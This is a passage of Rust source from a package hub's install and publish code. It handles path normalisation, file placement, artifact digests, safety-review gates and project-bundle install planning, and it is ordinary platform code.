            "HUB_ASSET_KIND_INVALID",
            format!("asset kind must be one of: {}", HUB_ASSET_KINDS.join(", ")),
        ))
    }
}

fn normalize_platform_source_visibility(input: &str) -> String {
    match input.trim().to_ascii_lowercase().as_str() {
        "private" => "private".to_string(),
        _ => "public".to_string(),
    }
}

fn normalize_hub_grant_scope(input: &str) -> Result<String, PlatformError> {
    match input.trim() {
        "all_projects" => Ok("all_projects".to_string()),
        "selected_project" => Ok("selected_project".to_string()),
        _ => Err(PlatformError::new(
            "HUB_ACCESS_GRANT_INVALID",
            "grant_scope must be all_projects or selected_project",
        )),
    }
}

fn normalize_limit(value: i64, default_value: i64) -> i64 {
    if value <= 0 { default_value } else { value }
}

/// The refusal a retracted coordinate gives, carrying the publisher's reason.
fn retraction_message(package_id: &str, version: &str, reason: &str) -> String {
    let reason = reason.trim();
    if reason.is_empty() {
        format!("{package_id}@{version} was retracted by its publisher and its bytes are gone")
    } else {
        format!(
            "{package_id}@{version} was retracted by its publisher and its bytes are gone: {reason}"
        )
    }
}

fn validate_hub_version(version: &str) -> Result<(), PlatformError> {
    let valid = !version.is_empty()
        && version.len() <= 80
        && version
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b'_'))
        && !version.contains("..");
    if valid {
        Ok(())
    } else {
        Err(PlatformError::new(
            "HUB_PUBLISH_INVALID",
            "version must be a safe path segment",
        ))
    }
}

fn random_hex(bytes: usize) -> String {
    let mut data = vec![0u8; bytes];
    rand::rng().fill(data.as_mut_slice());
    data.into_iter()
        .map(|b| format!("{b:02x}"))
        .collect::<String>()
}

fn sha256_hex(input: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(input);
    hex_lower(&hasher.finalize())
}

/// The one spelling of a digest, so bytes hashed in one pass and bytes hashed
/// in many produce the same string.
fn hex_lower(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn normalize_repo_rel(input: &str) -> String {
    let trimmed = input
        .trim()
        .trim_start_matches("./")
        .trim_start_matches('/');
    trimmed.replace('\\', "/")
}

fn normalize_template_repo_rel(layout: &ResolvedProjectLayout, input: &str) -> String {
    let rel = normalize_repo_rel(input);
    if rel.is_empty() || layout.is_in_source(&rel) {
        rel
    } else {
        layout.source_rel(&rel)
    }
}

fn read_repo_entry(
    layout: &ProjectFileLayout,
    rel_path: &str,
    reason: String,
) -> Result<HubPackageFile, PlatformError> {
    let rel_path = normalize_repo_rel(rel_path);
    let abs = layout.repo_dir.join(&rel_path);
    if !abs.starts_with(&layout.repo_dir) || !abs.is_file() {
        return Err(PlatformError::new(
            "HUB_ENTRY_MISSING",
            format!("file '{}' not found", rel_path),
        ));
    }
    let bytes = fs::read(&abs)?;
    let size_bytes = bytes.len();
    let (encoding, content) = match String::from_utf8(bytes.clone()) {
        Ok(text) => ("text".to_string(), text),
        Err(_) => (
            "base64".to_string(),
            base64::engine::general_purpose::STANDARD.encode(bytes),
        ),
    };
    Ok(HubPackageFile {
        rel_path,
        kind: file_kind_from_path(&abs),
        size_bytes,
        reason,
        encoding,
        content: Some(content),
        artifact: None,
    })
}

fn list_repo_folders(layout: &ProjectFileLayout) -> Result<Vec<String>, PlatformError> {
    let mut out = Vec::new();
    walk_dirs(&layout.repo_dir, &layout.repo_dir, &mut out)?;
    out.sort();
    Ok(out)
}

fn walk_dirs(root: &Path, current: &Path, out: &mut Vec<String>) -> Result<(), PlatformError> {
    let mut entries = fs::read_dir(current)?.collect::<Result<Vec<_>, _>>()?;
    entries.sort_by_key(|item| item.path());
    for entry in entries {
        let path = entry.path();
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if name.starts_with(".git") {
            continue;
        }
        if path.is_dir() {
            if let Ok(rel) = path.strip_prefix(root) {
                let rel = rel.to_string_lossy().replace('\\', "/");
                if !rel.is_empty() {
                    out.push(rel);
                }
            }
            walk_dirs(root, &path, out)?;
        }
    }
    Ok(())
}

fn collect_tree_entries(
    layout: &ProjectFileLayout,
    rel_root: &str,
) -> Result<Vec<HubPackageFile>, PlatformError> {
    let rel_root = normalize_repo_rel(rel_root);
    let base = if rel_root.is_empty() || rel_root == "." {
        layout.repo_dir.clone()
    } else {
        layout.repo_dir.join(&rel_root)
    };
    if !base.starts_with(&layout.repo_dir) || !base.exists() {
        return Err(PlatformError::new(
            "HUB_SOURCE_INVALID",
            format!("path '{}' not found", rel_root),
        ));
    }
    let mut files = Vec::new();
    walk_files(&layout.repo_dir, &base, &mut files)?;
    Ok(files
        .into_iter()
        .map(|item| read_repo_entry(layout, &item, "included file".to_string()))
        .collect::<Result<Vec<_>, _>>()?)
}

fn walk_files(root: &Path, current: &Path, out: &mut Vec<String>) -> Result<(), PlatformError> {
    if current.is_file() {
        let rel = current
            .strip_prefix(root)
            .map_err(|_| PlatformError::new("HUB_SOURCE_INVALID", "path escaped repo root"))?;
        out.push(rel.to_string_lossy().replace('\\', "/"));
        return Ok(());
    }
    let mut entries = fs::read_dir(current)?.collect::<Result<Vec<_>, _>>()?;
    entries.sort_by_key(|item| item.path());
    for entry in entries {
        let path = entry.path();
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if name == ".git" {
            continue;
        }
        if path.is_dir() {
            walk_files(root, &path, out)?;
        } else if path.is_file() {
            let rel = path
                .strip_prefix(root)
                .map_err(|_| PlatformError::new("HUB_SOURCE_INVALID", "path escaped repo root"))?;
            out.push(rel.to_string_lossy().replace('\\', "/"));
        }
    }
    Ok(())
}

fn resolve_local_import(
    layout: &ProjectFileLayout,
    from_rel: &str,
    import_src: &str,
) -> Option<String> {
    let candidates = if let Some(rest) = import_src.strip_prefix("@/") {
        candidate_paths(rest)
    } else if import_src.starts_with('.') {
        let parent = Path::new(from_rel)
            .parent()
            .unwrap_or_else(|| Path::new(""));
        let joined = parent.join(import_src);
        let rel = joined.to_string_lossy().replace('\\', "/");
        candidate_paths(&rel)
    } else {
        return None;
    };
    for rel in candidates {
        let rel = normalize_repo_rel(&rel);
        let abs = layout.repo_source_dir().join(
            layout
                .repo_layout
                .strip_source(&rel)
                .unwrap_or(rel.as_str()),
        );
        if abs.is_file() {
            return Some(normalize_template_repo_rel(&layout.repo_layout, &rel));
        }
        let repo_abs = layout.repo_dir.join(&rel);
        if repo_abs.is_file() {
            return Some(rel);
        }
    }
    None
}

fn candidate_paths(base: &str) -> Vec<String> {
    let base = normalize_repo_rel(base);
    let mut out = vec![base.clone()];
    if Path::new(&base).extension().is_none() {
        for ext in [".tsx", ".ts", ".jsx", ".js", ".css", ".sql", ".json"] {
            out.push(format!("{base}{ext}"));
        }
        for ext in [
            "index.tsx",
            "index.ts",
            "index.jsx",
            "index.js",
            "index.css",
        ] {
            out.push(format!("{base}/{ext}"));
        }
    }
    out
}

fn file_kind_from_path(path: &Path) -> String {
    match path
        .extension()
        .and_then(|ext| ext.to_str())
        .unwrap_or_default()
    {
        "tsx" => "tsx".to_string(),
        "ts" => "ts".to_string(),
        "js" => "js".to_string(),
        "jsx" => "jsx".to_string(),
        "css" => "css".to_string(),
        "json" => "json".to_string(),
        "sql" => "sql".to_string(),
        other if !other.is_empty() => other.to_string(),
        _ => "file".to_string(),
    }
}

fn install_root_for_target_folder(
    layout: &ResolvedProjectLayout,
    package_id: &str,
    asset_kind: &str,
    target_folder: &str,
) -> String {
    let folder = target_folder.trim();
    if !folder.is_empty() {
        return normalize_install_target_folder(layout, folder, asset_kind);
    }
    default_install_target_folder(layout, package_id, asset_kind)
}

fn normalize_install_target_folder(
    layout: &ResolvedProjectLayout,
    target_folder: &str,
    asset_kind: &str,
) -> String {
    let folder = normalize_repo_rel(target_folder);
    if folder.is_empty() {
        return ".".to_string();
    }
    // Everything that is not a node bundle is project source, so a target
    // folder names a place inside the source root. It used to name one only
    // when the caller typed a leading slash, which made `billing` install
    // outside the root: nothing there is a pipeline by the discovery rule, so
    // the review found nothing and the install registered nothing, and the
    // package landed as inert files. Typing a slash is not consent to be
    // reviewed. Folder and project bundles joined that rule here: they carry
    // pipelines too, and were landing outside the source root for the same
    // reason under a different asset kind.
    if asset_kind != HUB_ASSET_KIND_NODE_BUNDLE
        && !layout.is_in_source(&folder)
        && folder != layout.source
    {
        return layout.source_rel(&folder);
    }
    folder
}

fn default_install_target_folder(
    layout: &ResolvedProjectLayout,
    package_id: &str,
    asset_kind: &str,
) -> String {
    if asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
        format!("nodes/{package_id}")
    } else {
        layout.source_rel(&format!("hub/{package_id}"))
    }
}

/// `rest` under `root`, where an empty or `.` root means the repository itself.
fn join_repo_rel(root: &str, rest: &str) -> String {
    if root.is_empty() || root == "." {
        rest.to_string()
    } else if rest.is_empty() {
        root.to_string()
    } else {
        format!("{root}/{rest}")
    }
}

/// Where one package's files land in one target project.
///
/// The review and the install both resolve every destination through this, so
/// what a review shows and what an install writes cannot be two answers. It is
/// built once from the package and the target project, and answers per entry.
enum HubInstallPlacement {
    /// Paths written verbatim under one root, with nothing to translate.
    ///
    /// Two packages are placed this way. A node bundle's `rel_path` names a
    /// file inside the bundle rather than inside anyone's project, so there is
    /// no publisher layout to translate from. A project bundle *is* a project:
    /// its paths are already repository-relative in the layout the new project
    /// adopts, because the bundle carries the `zebflow.yaml` that project is
    /// created from.
    Verbatim { install_root: String },
    /// Project paths, translated from the publisher's layout into the target's.
    Project {
        publisher: ResolvedProjectLayout,
        target: ResolvedProjectLayout,
        /// Repository-relative root for the package's source-area files.
        install_root: String,
        /// The package's own directory name, repeated inside each area it
        /// reaches, so one uninstall knows every place to look.
        folder: String,
    },
}

impl HubInstallPlacement {
    /// The placement of a bundle that is a whole project.
    ///
    /// The root is the repository itself: a project bundle occupies no folder
    /// inside a receiving project, it becomes one.
    fn whole_project() -> Self {
        Self::Verbatim {
            install_root: String::new(),
        }
    }

    fn new(
        target: &ResolvedProjectLayout,
        payload: &HubPackageSpec,
        package_id: &str,
        target_folder: &str,
    ) -> Self {
        let install_root =
            install_root_for_target_folder(target, package_id, &payload.asset_kind, target_folder);
        if payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
            return Self::Verbatim { install_root };
        }
        let folder = target
            .strip_source(&install_root)
            .unwrap_or(if install_root == target.source {
                ""
            } else {
                install_root.as_str()
            })
            .to_string();
        Self::Project {
            publisher: publisher_layout(payload),
            target: target.clone(),
            install_root,
            folder,
        }
    }

    /// The root reported to the caller: for project content, the source-area
    /// root, which is where the pipelines and pages go.
    fn install_root(&self) -> &str {
        match self {
            Self::Verbatim { install_root } => install_root,
            Self::Project { install_root, .. } => install_root,
        }
    }

    /// The repository-relative destination of one manifest entry.
    ///
    /// Areas whose contents are per-file are translated: source, assets, and
    /// docs each land in the directory the *target* keeps that kind of file in,
    /// under the package's own folder name. The schema exports and the node
    /// interface directory are not, because each holds one document for the
    /// whole project: a second copy cannot merge, and writing it at the
    /// canonical path would overwrite the target's own. Those stay inside the
    /// package's folder, readable and inert.
    fn destination(&self, rel_path: &str) -> String {
        let rel = normalize_repo_rel(rel_path);
        let (publisher, target, install_root, folder) = match self {
            Self::Verbatim { install_root } => return join_repo_rel(install_root, &rel),
            Self::Project {
                publisher,
                target,
                install_root,
                folder,
            } => (publisher, target, install_root, folder),
        };
        // Assets default *inside* the source root, so this order is the rule
        // and not a preference: testing source first would swallow them.
        if let Some(rest) = strip_dir_prefix(&publisher.assets, &rel) {
            return join_repo_rel(&join_repo_rel(&target.assets, folder), rest);
        }
        if let Some(rest) = strip_dir_prefix(&publisher.docs, &rel) {
            return join_repo_rel(&join_repo_rel(&target.docs, folder), rest);
        }
        if let Some(rest) = publisher.strip_source(&rel) {
            return join_repo_rel(install_root, rest);
        }
        // An export produced before the source root had a name wrote its
        // templates under this prefix. It names no area in any layout, so it
        // would otherwise survive into the destination as a stray segment.
        if let Some(rest) = rel.strip_prefix("templates/") {
            return join_repo_rel(install_root, rest);
        }
        join_repo_rel(install_root, &rel)
    }
}

/// The layout a package's manifest paths were produced by.
///
/// An absent declaration resolves through the same rule a project that declares
/// nothing resolves through, so "published before this field existed" and
/// "published by a project that moved nothing" are one case rather than two.
fn publisher_layout(payload: &HubPackageSpec) -> ResolvedProjectLayout {
    let declared = payload.layout.clone().unwrap_or_default();
    ZebflowJsonLayout {
        source: declared.source,
        assets: declared.assets,
        docs: declared.docs,
        schema: declared.schema,
        sqlite_schema: declared.sqlite_schema,
        node_interfaces: declared.node_interfaces,
        // A package names its seed prefixes in `project_initialization`, so the
        // layout does not carry them and this resolves to the default list.
        initial_data: None,
        // A publisher records what its own paths meant, never what a receiver
        // will accept. The extension set is the receiver's own floor, so it
        // resolves to the platform set here and is never read off a package.
        allowed_extensions: None,
    }
    .resolve()
}

/// How large one file may be before a release references it by digest instead
/// of carrying it inline.
///
/// Size decides, not type. Below the threshold a self-contained document is
/// worth its overhead: it is the whole package, one thing to move and read, and
/// the local file channel then needs no directory beside it. Above it the
/// overhead is real -- base64 costs 33% and every install pays to parse and
/// decode bytes it writes back out verbatim -- and nobody reads a megabyte of
/// anything by eye, so the argument for keeping it inline has run out.
///
/// In practice this leaves text alone, because the JSON, TSX, and `.zf.json` a
/// bundle is made of are kilobytes. It is not a rule about text: a megabyte of
/// SQL is no more diffable than a megabyte of WASM.
const HUB_PUBLISH_REFERENCE_THRESHOLD_BYTES: usize = 1024 * 1024;

/// Moves the entries a release should not carry out of the document.
///
/// The bytes are returned rather than stored: a publish that is refused after
/// this point must leave the artifact store as it found it, so the caller
/// stores them only once the release is otherwise accepted. The decision is
/// made after the publish review for the same reason it is safe to make -- it
/// changes how bytes are supplied and never which bytes they are, so the review
/// reads the same content either way.
fn reference_large_publish_entries(
    entries: &mut [HubPackageFile],
) -> Result<Vec<Vec<u8>>, PlatformError> {
    let mut referenced = Vec::new();
    for entry in entries.iter_mut() {
        if entry.size_bytes <= HUB_PUBLISH_REFERENCE_THRESHOLD_BYTES {
            continue;
        }
        let Some(HubPackageFileSupply::Carried(content)) = entry.supply() else {
            continue;
        };
        let bytes = if entry.encoding == "base64" {
            base64::engine::general_purpose::STANDARD
                .decode(content)
                .map_err(|err| {
                    PlatformError::new(
                        "HUB_PUBLISH",
                        format!("file '{}' is not base64: {err}", entry.rel_path),
                    )
                })?
        } else {
            content.as_bytes().to_vec()
        };
        let sha256 = sha256_hex(&bytes);
        // `size_bytes` already counts the raw bytes rather than the base64, so
        // it means the same thing on both sides of this change.
        entry.encoding = String::new();
        entry.content = None;
        entry.artifact = Some(HubPackageArtifactRef {
            sha256,
            media_type: artifact_media_type_from_path(&entry.rel_path),
        });
        referenced.push(bytes);
    }
    Ok(referenced)
}

/// A hint at what the referenced bytes are, for a reader that never sees them.
///
/// It is a hint and not a claim: nothing installs by it, and the digest decides
/// what the bytes actually are.
fn artifact_media_type_from_path(rel_path: &str) -> String {
    let ext = Path::new(rel_path)
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    match ext.as_str() {
        "wasm" => "application/wasm",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "webp" => "image/webp",
        "gif" => "image/gif",
        "svg" => "image/svg+xml",
        "pdf" => "application/pdf",
        "zip" => "application/zip",
        "woff2" => "font/woff2",
        "woff" => "font/woff",
        "ttf" => "font/ttf",
        "mp4" => "video/mp4",
        "mp3" => "audio/mpeg",
        _ => "application/octet-stream",
    }
    .to_string()
}

/// The layout entries a publish records, so a receiver knows what the paths in
/// this manifest meant.
fn recorded_publisher_layout(layout: &ResolvedProjectLayout) -> HubPackageLayout {
    // Every entry is written out rather than only the ones that differ from the
    // default: a release must mean the same thing forever, and a document that
    // leans on the reader's defaults means whatever the reader's defaults
    // become.
    HubPackageLayout {
        source: Some(layout.source.clone()),
        assets: Some(layout.assets.clone()),
        docs: Some(layout.docs.clone()),
        schema: Some(layout.schema.clone()),
        sqlite_schema: Some(layout.sqlite_schema.clone()),
        node_interfaces: Some(layout.node_interfaces.clone()),
    }
}

/// The bytes one manifest entry writes.
///
/// A carried entry has them inline; a referenced entry is fetched from the
/// channel and verified against its declared digest. Either way the bytes are
/// produced before anything is written, so a reference that cannot be resolved
/// refuses the install instead of landing as an empty file.
fn hub_entry_bytes(
    entry: &HubPackageFile,
    artifacts: &HubArtifactChannel,
) -> Result<Vec<u8>, PlatformError> {
    match entry.supply() {
        Some(HubPackageFileSupply::Carried(content)) if entry.encoding == "base64" => {
            base64::engine::general_purpose::STANDARD
                .decode(content)
                .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))
        }
        Some(HubPackageFileSupply::Carried(content)) => Ok(content.as_bytes().to_vec()),
        Some(HubPackageFileSupply::Referenced(artifact)) => {
            artifacts.resolve(&entry.rel_path, artifact, entry.size_bytes)
        }
        None => Err(PlatformError::new(
            "HUB_INSTALL",
            format!(
                "file '{}' declares neither carried content nor a referenced artifact",
                entry.rel_path
            ),
        )),
    }
}

fn prepare_hub_install_entries(
    placement: &HubInstallPlacement,
    install_base: &Path,
    files: &[HubPackageFile],
    artifacts: &HubArtifactChannel,
) -> Result<Vec<PreparedHubInstallEntry>, PlatformError> {
    let mut seen = HashSet::new();
    let mut prepared = Vec::with_capacity(files.len());
    for entry in files {
        let install_rel = placement.destination(&entry.rel_path);
        if !seen.insert(install_rel.clone()) {
            return Err(PlatformError::new(
                "HUB_INSTALL",
                format!("package contains duplicate destination '{install_rel}'"),
            ));
        }
        let destination = install_base.join(&install_rel);
        if !destination.starts_with(install_base) {
            return Err(PlatformError::new(
                "HUB_INSTALL",
                format!("destination '{install_rel}' escapes the install root"),
            ));
        }
        let previous = match std::fs::symlink_metadata(&destination) {
            Ok(metadata) if metadata.file_type().is_symlink() => {
                return Err(PlatformError::new(
                    "HUB_INSTALL",
                    format!("destination '{install_rel}' is a symbolic link"),
                ));
            }
            Ok(metadata) if !metadata.is_file() => {
                return Err(PlatformError::new(
                    "HUB_INSTALL",
                    format!("destination '{install_rel}' is not a regular file"),
                ));
            }
            Ok(_) => Some(std::fs::read(&destination)?),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => None,
            Err(error) => return Err(error.into()),
        };
        prepared.push(PreparedHubInstallEntry {
            install_rel,
            destination,
            bytes: hub_entry_bytes(entry, artifacts)?,
            previous,
        });
    }
    Ok(prepared)
}

/// Refuses an install whose prepared content the review rejects.
///
/// This is the gate every channel passes through, so that "every channel runs
/// the same review" is true by construction rather than by each call site
/// remembering to ask. It reviews the *prepared* entries: their bytes are
/// already resolved and their paths are the destinations that will be written,
/// so the review reads exactly what the install is about to place, with no
/// second fetch and no chance of the two disagreeing.
///
/// Callers that review earlier still do -- a user is shown the verdict before
/// deciding. This one is not for showing; it is the refusal that cannot be
/// skipped.
fn refuse_prepared_install_violations(
    layout: &ResolvedProjectLayout,
    asset_kind: &str,
    entries: &[PreparedHubInstallEntry],
) -> Result<(), PlatformError> {
    // Read through the same constructor the channel-fed gates use. The bytes
    // are already resolved here, so nothing can be unfetched -- but binary at a
    // path the scan reads as a pipeline is still bytes the review cannot see
    // and the install would still write, and that is the one judgement this
    // gate used to make differently from the others.
    let policy_entries = entries
        .iter()
        .map(|entry| {
            PackagePolicyEntry::from_bytes(
                &entry.install_rel,
                file_kind_from_path(Path::new(&entry.install_rel)),
                entry.bytes.len(),
                &entry.bytes,
            )
        })
        .collect::<Vec<_>>();
    let review = review_package_entries(
        layout,
        &policy_entries,
        Vec::new(),
        PackageReviewOptions {
            bundle_internal_paths: asset_kind == HUB_ASSET_KIND_NODE_BUNDLE,
            ..PackageReviewOptions::default()
        },
    );
    if !review.is_installable() {
        return Err(PlatformError::new(
            "HUB_INSTALL_REFUSED",
            format!(
                "package cannot be installed: {}",
                review.violations.join("; ")
            ),
        ));
    }
    Ok(())
}

fn validate_prepared_pipeline_sources(
    layout: &ResolvedProjectLayout,
    entries: &[PreparedHubInstallEntry],
) -> Result<(), PlatformError> {
    for entry in entries
        .iter()
        .filter(|entry| layout.is_pipeline_rel_path(&entry.install_rel))
    {
        decode_pipeline_graph(&entry.bytes).map_err(|error| {
            PlatformError::new(
                "HUB_INSTALL",
                format!(
                    "invalid pipeline '{}': {} ({})",
                    entry.install_rel,
                    error,
                    error.category()
                ),
            )
        })?;
    }
    Ok(())
}

fn restore_hub_install_entries(
    install_base: &Path,
    entries: &[PreparedHubInstallEntry],
) -> Result<(), PlatformError> {
    let mut errors = Vec::new();
    for entry in entries.iter().rev() {
        let result = match &entry.previous {
            Some(previous) => atomic_write(&entry.destination, previous),
            None => durable_remove_file(&entry.destination),
        };
        if let Err(error) = result {
            errors.push(format!("{}: {error}", entry.install_rel));
        }
    }
    for entry in entries.iter().filter(|entry| entry.previous.is_none()) {
        let mut parent = entry.destination.parent();
        while let Some(path) = parent {
            if path == install_base || !path.starts_with(install_base) {
                break;
            }
            match std::fs::remove_dir(path) {
                Ok(()) => parent = path.parent(),
                Err(error)
                    if matches!(
                        error.kind(),
                        std::io::ErrorKind::NotFound | std::io::ErrorKind::DirectoryNotEmpty
                    ) =>
                {
                    break;
                }
                Err(error) => {
                    errors.push(format!("{}: {error}", path.display()));
                    break;
                }
            }
        }
    }
    if errors.is_empty() {
        Ok(())
    } else {
        Err(PlatformError::new(
            "HUB_INSTALL_RECOVERY",
            format!("failed restoring package files: {}", errors.join("; ")),
        ))
    }
}

fn parse_hub_artifact_bytes(
    bytes: &[u8],
    error_code: &'static str,
) -> Result<HubPackageSpec, PlatformError> {
    decode_hub_package(bytes)
        .map(|document| document.spec)
        .map_err(|err| PlatformError::new(error_code, format!("{} ({})", err, err.category())))
}

/// Parses a locally supplied bundle and refuses anything that is not one.
///
/// The transport is the same `HubPackage` envelope a published artifact uses,
/// so this reuses that contract rather than inventing a second package format.
fn parse_local_node_bundle_artifact(
    value: Value,
    error_code: &'static str,
) -> Result<HubPackageSpec, PlatformError> {
    require_node_bundle_kind(parse_hub_artifact_value(value, error_code)?, error_code)
}

/// Reads one bundle document from disk, bounded by the document ceiling.
///
/// The size is checked before the read, so an oversized file is refused rather
/// than loaded to discover it is too big.
fn read_local_node_bundle_document(
    document_path: &Path,
    error_code: &'static str,
) -> Result<HubPackageSpec, PlatformError> {
    let metadata = fs::metadata(document_path)?;
    if !metadata.is_file() {
        return Err(PlatformError::new(
            error_code,
            format!("'{}' is not a file", document_path.display()),
        ));
    }
    if metadata.len() > MAX_REMOTE_HUB_ARTIFACT_BYTES {
        return Err(PlatformError::new(
            error_code,
            format!(
                "'{}' exceeds the package document limit",
                document_path.display()
            ),
        ));
    }
    let raw = fs::read(document_path)?;
    require_node_bundle_kind(parse_hub_artifact_bytes(&raw, error_code)?, error_code)
}

fn require_node_bundle_kind(
    payload: HubPackageSpec,
    error_code: &'static str,
) -> Result<HubPackageSpec, PlatformError> {
    if payload.asset_kind != HUB_ASSET_KIND_NODE_BUNDLE {
        return Err(PlatformError::new(
            error_code,
            format!(
                "this endpoint installs node bundles; the package declares asset_kind '{}'",
                payload.asset_kind
            ),
        ));
    }
    Ok(payload)
}

fn parse_hub_artifact_value(
    value: Value,
    error_code: &'static str,
) -> Result<HubPackageSpec, PlatformError> {
    decode_contract_value::<HubPackageContract>(value)
        .map(|document| document.spec)
        .map_err(|err| PlatformError::new(error_code, format!("{} ({})", err, err.category())))
}

fn encode_hub_artifact(
    package_id: &str,
    version: &str,
    artifact: &HubPackageSpec,
    error_code: &'static str,
) -> Result<Vec<u8>, PlatformError> {
    let mut metadata = ContractMetadata::named(package_id);
    metadata.version = Some(version.to_string());
    encode_hub_package(metadata, artifact.clone())
        .map_err(|err| PlatformError::new(error_code, format!("{} ({})", err, err.category())))
}

fn verify_hub_artifact_bytes(bytes: &[u8], expected: &str) -> Result<(), PlatformError> {
    let actual = sha256_hex(bytes);
    if actual == expected {
        return Ok(());
    }
    Err(PlatformError::new(
        "HUB_ARTIFACT_INTEGRITY",
        format!("hub artifact hash mismatch: expected {expected}, got {actual}"),
    ))
}

/// The slug a project bundle's new project is named from.
fn project_bundle_base_slug(package_id: &str) -> Result<String, PlatformError> {
    let base = slug_segment(package_id);
    if base.is_empty() {
        return Err(PlatformError::new(
            "HUB_REMOTE_INVALID",
            "package id is not a valid project slug",
        ));
    }
    Ok(base)
}

/// The name the `suffix`th candidate project takes.
///
/// Shared so the review names the project the install creates rather than
/// following the same rule a second time. A name still free when the review ran
/// can be claimed before the install runs, in which case the install moves on
/// to the following suffix.
fn project_bundle_slug_candidate(base: &str, suffix: usize) -> String {
    if suffix == 1 {
        base.to_string()
    } else {
        format!("{base}-{suffix}")
    }
}

/// One bundle entry, resolved: where it lands and the bytes that land there.
#[derive(Debug, Clone)]
struct PlannedProjectBundleEntry {
    /// Repository-relative destination, answered by the shared placement.
    destination: String,
    bytes: Vec<u8>,
}

/// One pipeline this install registers, read once from the bytes it writes.
#[derive(Debug)]
struct PlannedPipelineRegistration {
    /// The identity it is stored under, which is source-relative.
    identity: String,
    description: String,
    trigger_kind: String,
    source: String,
}

/// Everything installing a project bundle would do, decided before it does any
/// of it.
///
/// The review renders this and the install executes it, so the two cannot be
/// two answers: there is one computation of the destinations, the
/// registrations, the activations and the SQL, and both callers read it out.
///
/// Building it is read-only. It resolves every entry's bytes, decodes the
/// bundle's own `zebflow.yaml` and `zeb.lock`, and reviews the whole package.
/// The only refusal left after this is re-encoding those two documents under
/// the new project's name, and that runs before the project is created too, so
/// no refusal on this path leaves a project behind.
#[derive(Debug)]
struct ProjectBundleInstallPlan {
    /// The reading of the whole bundle, including the entries the scope drops.
    safety: PackageSafetyReview,
    /// Repository-relative destinations the scope keeps, in write order.
    ///
    /// The placement answers these without opening a single file, so they are
    /// known even for a bundle the safety review refuses.
    destinations: Vec<String>,
    skipped_files: Vec<String>,
    /// The SQL steps `execute_schema` replays, as the bundle declares them.
    initial_data: Vec<HubPackageInitialDataStep>,
    unexecuted_initial_data: Vec<String>,
    database_initialization: Vec<DatabaseInitializationReport>,
    /// The work an installable bundle authorises, or the refusal that stands in
    /// its place.
    ///
    /// Everything here needs the bundle's bytes, and a refused bundle's bytes
    /// are never fetched: which of two failures a package hits first must not
    /// decide whether a user is told "this is not installable, here is why" or
    /// handed a transport error.
    prepared: Result<PreparedProjectBundle, PlatformError>,
}

/// The half of a plan that needed the bundle's bytes to decide.
#[derive(Debug)]
struct PreparedProjectBundle {
    entries: Vec<PlannedProjectBundleEntry>,
    registrations: Vec<PlannedPipelineRegistration>,
    pipelines_activated: Vec<String>,
    pipelines_not_activated: Vec<String>,
    /// The bundle's own configuration and lock, decoded, with the index of the
    /// entry each one is written back into.
    configuration: (usize, ContractDocument<ProjectConfigurationSpec>),
    lock: Option<(usize, ContractDocument<DependencyLockSpec>)>,
}

impl ProjectBundleInstallPlan {
    fn build(
        artifact: &HubPackageSpec,
        artifacts: &HubArtifactChannel,
        scope: HubInstallScope,
    ) -> Result<Self, PlatformError> {
        scope.validate()?;
        if validate_hub_asset_kind(&artifact.asset_kind)? != HUB_ASSET_KIND_PROJECT_BUNDLE {
            return Err(PlatformError::new(
                "HUB_REMOTE_INVALID",
                "platform hub install only supports project bundles",
            ));
        }
        // The layout the created project resolves to. That is the publisher's
        // own: this bundle carries the `zebflow.yaml` the new project is made
        // from. Asking the platform default instead classified a `source: src`
        // bundle's pipelines as ordinary files, so nothing scanned them and the
        // review reported a risk level for content it had not read.
        let layout = publisher_layout(artifact);
        // A project bundle is the project, so its paths are already
        // repository-relative in the layout that project adopts and there is
        // nothing to translate. The placement is asked anyway, because every
        // destination on every install path is answered in one place.
        let placement = HubInstallPlacement::whole_project();
        // The reading covers the whole bundle, including the entries the scope
        // is about to drop, so narrowing an install can only shrink what has
        // already been found installable.
        let safety = review_project_bundle_entries(&layout, &artifact.files, artifacts);

        let mut kept = Vec::new();
        let mut skipped_files = Vec::new();
        for file in &artifact.files {
            let destination = placement.destination(&file.rel_path);
            if install_entry_is_in_scope(&layout, &destination, scope) {
                kept.push((destination, file));
            } else {
                skipped_files.push(destination);
            }
        }
        skipped_files.sort();
        let destinations = kept
            .iter()
            .map(|(destination, _)| destination.clone())
            .collect::<Vec<_>>();

        // The review covered the whole bundle; this describes the install, so a
        // file the scope dropped is reported as skipped and not as SQL that
        // would run.
        let installed = destinations.iter().cloned().collect::<BTreeSet<_>>();
        let database_initialization = safety
            .database_initialization
            .iter()
            .filter(|report| installed.contains(&normalize_repo_rel(&report.source)))
            .cloned()
            .collect();
        let initial_data = artifact.project_initialization.initial_data.clone();
        // The SQL lands in repo/ and the stores are left untouched, so the plan
        // names the scripts that are waiting rather than letting an unapplied
        // schema pass for an applied one.
        let unexecuted_initial_data = if scope.include_schema && !scope.execute_schema {
            initial_data.iter().map(|step| step.path.clone()).collect()
        } else {
            Vec::new()
        };

        let prepared = match refuse_unreviewable_project_bundle(&safety) {
            Ok(()) => Ok(PreparedProjectBundle::build(
                &layout,
                &kept,
                artifacts,
                &artifact.active_pipelines,
            )?),
            Err(refusal) => Err(refusal),
        };

        Ok(Self {
            safety,
            destinations,
            skipped_files,
            initial_data,
            unexecuted_initial_data,
            database_initialization,
            prepared,
        })
    }

    /// The work this plan authorises, or the refusal that replaces it.
    ///
    /// A bundle the safety review refuses has no prepared work at all, so
    /// asking what the install would do and asking whether it may run are one
    /// question with one answer.
    fn accept(&self) -> Result<&PreparedProjectBundle, PlatformError> {
        self.prepared.as_ref().map_err(|refusal| refusal.clone())
    }

    /// The identities the install registers, in the order it registers them.
    fn pipeline_identities(&self) -> Vec<String> {
        self.prepared
            .as_ref()
            .map(PreparedProjectBundle::pipeline_identities)
            .unwrap_or_default()
    }

    fn pipelines_activated(&self) -> Vec<String> {
        self.prepared
            .as_ref()
            .map(|prepared| prepared.pipelines_activated.clone())
